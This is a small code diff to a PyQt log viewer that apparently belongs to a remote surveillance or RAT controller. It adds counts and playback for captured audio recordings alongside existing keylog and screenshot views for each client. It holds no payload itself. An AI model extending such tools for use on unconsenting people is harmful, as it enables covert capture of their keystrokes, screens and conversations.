@@ -96,6 +96,10 @@ class LogViewer(QWidget, logViewerUi):
         self.keylogsCountOldLabel.setText(old)
 
         # Check Audio
+        data = data_get(self.socket, '%s %s' % (self.client_id, self.date), 'countAudios', session_id=self.session_id)
+        new, old = data['payload'].split('/')
+        self.audioCountNewLabel.setText(new)
+        self.audioCountOldLabel.setText(old)
 
     def open_screenshot(self):
         current_screenshot_path = str(self.screenshotsTable.item(self.screenshotsTable.currentRow(), 2).text())
@@ -104,6 +108,10 @@ class LogViewer(QWidget, logViewerUi):
     def open_keylog(self):
         current_keylog_path = str(self.keylogsTable.item(self.keylogsTable.currentRow(), 2).text())
         os.startfile(current_keylog_path)
+
+    def open_audio(self):
+        current_audio_path = str(self.audioTable.item(self.audioTable.currentRow(), 2).text())
+        os.startfile(current_audio_path)
 
     def download_data(self):
 
